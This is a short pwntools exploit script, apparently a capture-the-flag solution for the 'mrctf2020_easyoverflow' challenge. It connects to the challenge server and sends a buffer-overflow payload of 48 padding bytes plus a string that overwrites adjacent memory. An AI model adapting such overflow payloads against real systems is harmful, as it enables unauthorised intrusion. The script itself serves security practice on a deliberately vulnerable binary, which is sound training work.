#Made by fly_autumn
#x64 ...
from pwn import *
#p = process("./mrctf2020_easyoverflow")
p = remote("node5.buuoj.cn",25681)
elf = ELF("./mrctf2020_easyoverflow")
context(os="linux",arch="amd64")

offset = 48
payload = b"A" * offset + b"n0t_r3@11y_f1@g"
p.sendline(payload)

p.interactive()
